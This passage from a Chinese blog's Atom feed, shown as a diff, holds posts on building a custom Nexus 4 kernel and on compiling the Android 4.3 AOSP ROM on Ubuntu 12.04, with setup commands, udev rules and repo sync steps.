+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;make mako_defconfig&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;make -jN&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;就开始Kernel的编译，N表示make并行运行的线程数，可以加快编译速度。&lt;/p&gt;
+&lt;p&gt;编译完成后可以在&lt;code&gt;arch/arm/boot/&lt;/code&gt;目录下看到一个zImage文件，这个就是编译好的Android内核文件。对于Nexus 4，将这个zImage文件拷贝到Android源代码目录下的&lt;code&gt;device/lge/mako-kernel/&lt;/code&gt;下，并重命名为kernel，这样就替换了原有的内核。当你再次编译Android源代码时，系统就会将你编译的新内核编译进ROM里了。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;编译Android源代码时使用的是Google提供的已经编译好的一个Kernel，如果你想使用自己的Kernel，就需要下载Kernel源代码进行编译。&lt;/p&gt;
+&lt;p&gt;1、下载Kernel源代码&lt;/p&gt;
+&lt;p&gt;使用Git下载对应版本的Kernel源码，例如Nexus 4用的是Qualcomm的芯片，对应的是msm的源码，就可以使用下面这条命令进行clone。&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mkdir msm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; msm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;git &lt;span class=&quot;built_in&quot;&gt;clone&lt;/span&gt; https://android.googlesource.com/kernel/msm.git&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+    
+    </summary>
+    
+      <category term="移动计算" scheme="http://blog.clarkhuang.com/categories/%E7%A7%BB%E5%8A%A8%E8%AE%A1%E7%AE%97/"/>
+    
+    
+      <category term="Android" scheme="http://blog.clarkhuang.com/tags/Android/"/>
+    
+      <category term="Kernel" scheme="http://blog.clarkhuang.com/tags/Kernel/"/>
+    
+      <category term="Ubuntu" scheme="http://blog.clarkhuang.com/tags/Ubuntu/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Ubuntu12.04LTS下编译Android源代码</title>
+    <link href="http://blog.clarkhuang.com/2013/08/28/how-to-compile-android-in-ubuntu/"/>
+    <id>http://blog.clarkhuang.com/2013/08/28/how-to-compile-android-in-ubuntu/</id>
+    <published>2013-08-28T12:00:41.000Z</published>
+    <updated>2016-05-22T05:58:39.000Z</updated>
+    
+    <content type="html">&lt;p&gt;本文主要记录了如何在Ubuntu 12.04 LTS 64bit下使用AOSP源码编译用于Nexus 4的Android 4.3 ROM。&lt;/p&gt;
+&lt;p&gt;一、编译需求&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Linux/Mac OS&lt;/li&gt;
+&lt;li&gt;Froyo(2.2.x)以前可以使用32bit的操作系统，Gingerbread(2.3.x)之后的版本需要64bit操作系统&lt;/li&gt;
+&lt;li&gt;30GB以上的硬盘空间&lt;/li&gt;
+&lt;li&gt;Python 2.6-2.7&lt;/li&gt;
+&lt;li&gt;GNU Make 3.81-3.82&lt;/li&gt;
+&lt;li&gt;如果编译Gingerbread(2.3.x)之后的版本需要JDK 6，如果编译的是Froyo(2.2.x)或更老的版本则使用JDK 5&lt;/li&gt;
+&lt;li&gt;Git 1.7或更新版本&lt;/li&gt;
+&lt;/ul&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;p&gt;二、初始化编译环境&lt;/p&gt;
+&lt;p&gt;1. 安装JDK&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo add-apt-repository ppa:webupd8team/java&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install oracle-java6-installer&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;安装过程中需要同意Oracle的授权协议。&lt;/p&gt;
+&lt;p&gt;安装完成后使用&lt;code&gt;java -version&lt;/code&gt;和&lt;code&gt;javac&lt;/code&gt;命令测试JDK是否安装成功。&lt;/p&gt;
+&lt;p&gt;2、安装所需的包文件&lt;/p&gt;
+&lt;p&gt;由于Ubuntu使用的是64bit的，所以需要先安装32bit的包。&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install ia32-libs&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;然后再安装一下的依赖包&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install git gnupg flex bison gperf build-essential \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  zip curl libc6-dev libncurses5-dev:i386 x11proto-core-dev \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  libx11-dev:i386 libreadline6-dev:i386 libgl1-mesa-glx:i386 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  libgl1-mesa-dev g++-multilib mingw32 tofrodos \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  python-markdown libxml2-utils xsltproc zlib1g-dev:i386&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo ln &lt;span class=&quot;_&quot;&gt;-s&lt;/span&gt; /usr/lib/i386-linux-gnu/mesa/libGL.so.1 /usr/lib/i386-linux-gnu/libGL.so&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;3、配置USB访问&lt;/p&gt;
+&lt;p&gt;以Root用户创建文件&lt;code&gt;/etc/udev/rules.d/51-android.rules&lt;/code&gt;，并在新创建的rules文件中加入以下代码。&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# adb protocol on passion (Nexus One)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SUBSYSTEM==&amp;quot;usb&amp;quot;, ATTR&amp;#123;idVendor&amp;#125;==&amp;quot;18d1&amp;quot;, ATTR&amp;#123;idProduct&amp;#125;==&amp;quot;4e12&amp;quot;, MODE=&amp;quot;0600&amp;quot;, OWNER=&amp;quot;&amp;lt;username&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# fastboot protocol on passion (Nexus One)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SUBSYSTEM==&amp;quot;usb&amp;quot;, ATTR&amp;#123;idVendor&amp;#125;==&amp;quot;0bb4&amp;quot;, ATTR&amp;#123;idProduct&amp;#125;==&amp;quot;0fff&amp;quot;, MODE=&amp;quot;0600&amp;quot;, OWNER=&amp;quot;&amp;lt;username&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# adb protocol on crespo/crespo4g (Nexus S)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SUBSYSTEM==&amp;quot;usb&amp;quot;, ATTR&amp;#123;idVendor&amp;#125;==&amp;quot;18d1&amp;quot;, ATTR&amp;#123;idProduct&amp;#125;==&amp;quot;4e22&amp;quot;, MODE=&amp;quot;0600&amp;quot;, OWNER=&amp;quot;&amp;lt;username&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# fastboot protocol on crespo/crespo4g (Nexus S)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SUBSYSTEM==&amp;quot;usb&amp;quot;, ATTR&amp;#123;idVendor&amp;#125;==&amp;quot;18d1&amp;quot;, ATTR&amp;#123;idProduct&amp;#125;==&amp;quot;4e20&amp;quot;, MODE=&amp;quot;0600&amp;quot;, OWNER=&amp;quot;&amp;lt;username&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# adb protocol on stingray/wingray (Xoom)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SUBSYSTEM==&amp;quot;usb&amp;quot;, ATTR&amp;#123;idVendor&amp;#125;==&amp;quot;22b8&amp;quot;, ATTR&amp;#123;idProduct&amp;#125;==&amp;quot;70a9&amp;quot;, MODE=&amp;quot;0600&amp;quot;, OWNER=&amp;quot;&amp;lt;username&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# fastboot protocol on stingray/wingray (Xoom)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SUBSYSTEM==&amp;quot;usb&amp;quot;, ATTR&amp;#123;idVendor&amp;#125;==&amp;quot;18d1&amp;quot;, ATTR&amp;#123;idProduct&amp;#125;==&amp;quot;708c&amp;quot;, MODE=&amp;quot;0600&amp;quot;, OWNER=&amp;quot;&amp;lt;username&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# adb protocol on maguro/toro (Galaxy Nexus)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SUBSYSTEM==&amp;quot;usb&amp;quot;, ATTR&amp;#123;idVendor&amp;#125;==&amp;quot;04e8&amp;quot;, ATTR&amp;#123;idProduct&amp;#125;==&amp;quot;6860&amp;quot;, MODE=&amp;quot;0600&amp;quot;, OWNER=&amp;quot;&amp;lt;username&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# fastboot protocol on maguro/toro (Galaxy Nexus)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SUBSYSTEM==&amp;quot;usb&amp;quot;, ATTR&amp;#123;idVendor&amp;#125;==&amp;quot;18d1&amp;quot;, ATTR&amp;#123;idProduct&amp;#125;==&amp;quot;4e30&amp;quot;, MODE=&amp;quot;0600&amp;quot;, OWNER=&amp;quot;&amp;lt;username&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# adb protocol on panda (PandaBoard)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SUBSYSTEM==&amp;quot;usb&amp;quot;, ATTR&amp;#123;idVendor&amp;#125;==&amp;quot;0451&amp;quot;, ATTR&amp;#123;idProduct&amp;#125;==&amp;quot;d101&amp;quot;, MODE=&amp;quot;0600&amp;quot;, OWNER=&amp;quot;&amp;lt;username&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# fastboot protocol on panda (PandaBoard)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SUBSYSTEM==&amp;quot;usb&amp;quot;, ATTR&amp;#123;idVendor&amp;#125;==&amp;quot;0451&amp;quot;, ATTR&amp;#123;idProduct&amp;#125;==&amp;quot;d022&amp;quot;, MODE=&amp;quot;0600&amp;quot;, OWNER=&amp;quot;&amp;lt;username&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# usbboot protocol on panda (PandaBoard)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SUBSYSTEM==&amp;quot;usb&amp;quot;, ATTR&amp;#123;idVendor&amp;#125;==&amp;quot;0451&amp;quot;, ATTR&amp;#123;idProduct&amp;#125;==&amp;quot;d00f&amp;quot;, MODE=&amp;quot;0600&amp;quot;, OWNER=&amp;quot;&amp;lt;username&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# usbboot protocol on panda (PandaBoard ES)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SUBSYSTEM==&amp;quot;usb&amp;quot;, ATTR&amp;#123;idVendor&amp;#125;==&amp;quot;0451&amp;quot;, ATTR&amp;#123;idProduct&amp;#125;==&amp;quot;d010&amp;quot;, MODE=&amp;quot;0600&amp;quot;, OWNER=&amp;quot;&amp;lt;username&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# adb protocol on grouper/tilapia (Nexus 7)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SUBSYSTEM==&amp;quot;usb&amp;quot;, ATTR&amp;#123;idVendor&amp;#125;==&amp;quot;18d1&amp;quot;, ATTR&amp;#123;idProduct&amp;#125;==&amp;quot;4e42&amp;quot;, MODE=&amp;quot;0600&amp;quot;, OWNER=&amp;quot;&amp;lt;username&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# fastboot protocol on grouper/tilapia (Nexus 7)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SUBSYSTEM==&amp;quot;usb&amp;quot;, ATTR&amp;#123;idVendor&amp;#125;==&amp;quot;18d1&amp;quot;, ATTR&amp;#123;idProduct&amp;#125;==&amp;quot;4e40&amp;quot;, MODE=&amp;quot;0600&amp;quot;, OWNER=&amp;quot;&amp;lt;username&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# adb protocol on manta (Nexus 10)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SUBSYSTEM==&amp;quot;usb&amp;quot;, ATTR&amp;#123;idVendor&amp;#125;==&amp;quot;18d1&amp;quot;, ATTR&amp;#123;idProduct&amp;#125;==&amp;quot;4ee2&amp;quot;, MODE=&amp;quot;0600&amp;quot;, OWNER=&amp;quot;&amp;lt;username&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# fastboot protocol on manta (Nexus 10)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SUBSYSTEM==&amp;quot;usb&amp;quot;, ATTR&amp;#123;idVendor&amp;#125;==&amp;quot;18d1&amp;quot;, ATTR&amp;#123;idProduct&amp;#125;==&amp;quot;4ee0&amp;quot;, MODE=&amp;quot;0600&amp;quot;, OWNER=&amp;quot;&amp;lt;username&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;注意需要将&lt;username&gt;替换为自己的用户名，以允许通过USB访问手机。&lt;/username&gt;&lt;/p&gt;
+&lt;p&gt;三、下载源代码&lt;/p&gt;
+&lt;p&gt;1、初始化Repo工具&lt;/p&gt;
+&lt;p&gt;Repo是Google为方便同步Android源代码开发的一个Git同步脚本，我们同步Android源代码就使用它。&lt;/p&gt;
+&lt;p&gt;首先创建一个/bin目录，并将它加入你的PATH中&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mkdir ~/bin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PATH=&lt;span class=&quot;variable&quot;&gt;$PATH&lt;/span&gt;:~/bin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;然后下载Repo工具，并给它加上可执行权限&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;curl http://commondatastorage.googleapis.com/git-repo-downloads/repo &amp;gt; ~/bin/repo&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;chmod a+x ~/bin/repo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;对于1.17版的Repo工具，它的SHA-1值为&lt;em&gt;ddd79b6d5a7807e911b524cb223bc3544b661c28&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;对于1.19版的Repo工具，它的SHA-1值为&lt;em&gt;92cbad8c880f697b58ed83e348d06619f8098e6c&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;对于1.20版的Repo工具，它的SHA-1值为&lt;em&gt;e197cb48ff4ddda4d11f23940d316e323b29671c&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;2、初始化Repo客户端&lt;/p&gt;
+&lt;p&gt;首先创建一个空的工作目录&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mkdir WORKING_DIRECTORY&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; WORKING_DIRECTORY&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;然后使用repo init初始化工作目录&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;repo init -u https://android.googlesource.com/platform/manifest&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;也可使用-b参数指定check out的branch，例如&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;repo init -u https://android.googlesource.com/platform/manifest -b android-4.3_r2.1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;最后同步Android源代码&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;repo sync&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;Repo工具支持断点续传&lt;/p&gt;
+&lt;p&gt;下载完毕后如果需要切换分支可以先重新初始化到你想要的branch，然后再用repo sync进行同步即可。&lt;/p&gt;
+&lt;p&gt;3、下载Nexus 4专有驱动&lt;/p&gt;
+&lt;p&gt;Google公开了Nexus 4驱动的二进制文件，可以在&lt;a href=&quot;https://developers.google.com/android/nexus/drivers#mako&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://developers.google.com/android/nexus/drivers#mako&lt;/a&gt;选择对应版本下载。&lt;/p&gt;
+&lt;p&gt;下载好后解压缩可以得到三个.sh文件，分别是extract-broadcom-mako.sh，extract-lge-mako.sh和extract-qcom-mako.sh&lt;/p&gt;
+&lt;p&gt;将这三个文件放到WORKING_DIRECTORY下，并依次执行，其间需输入&lt;code&gt;I ACCEPT&lt;/code&gt;同意协议。执行完毕后会发现多了vender文件夹，该文件夹内就是Nexus 4驱动的二进制文件。&lt;/p&gt;
+&lt;p&gt;四、编译源码&lt;/p&gt;
+&lt;p&gt;1、初始化&lt;/p&gt;
+&lt;p&gt;使用envsetup.sh进行初始化&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;source&lt;/span&gt; build/envsetup.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;2、选择一个Target&lt;/p&gt;
+&lt;p&gt;使用lunch命令选择要编译的目标&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;lunch&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;再选择full_mako-userdebug对应的12号，或者直接输入&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;lunch full_mako-userdebug&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;需要注意的是这里的配置仅对本次终端会话有效，下次再打开终端需要重新输入这里的命令进行配置，才能继续后面的编译操作。&lt;/p&gt;
+&lt;p&gt;3、编译源代码&lt;/p&gt;
+&lt;p&gt;使用make命令编译源代码&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;make -jN&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;编译是一个耗时很长的工作，可以使用make工具并行编译，N一般设置为计算机所能同时运行的线程数。比如4核的CPU一般就设置N为4，如果有超线程技术，那就再加倍。&lt;/p&gt;
+&lt;p&gt;在漫长的等待之后(几十分钟到几个小时不等，取决于电脑性能)，默认情况下可以在&lt;code&gt;out/target/product/mako/&lt;/code&gt;目录下找到编译好的镜像文件，如果自己定义了输出目录，则去自定义的目录下找。也可以在make命令后加上otapackage参数将ROM打包成zip格式。&lt;/p&gt;
+&lt;p&gt;PS：AOSP的源码中不包含Google Service组件，需要到&lt;a href=&quot;http://goo.im/gapps&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://goo.im/gapps&lt;/a&gt;上下载。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
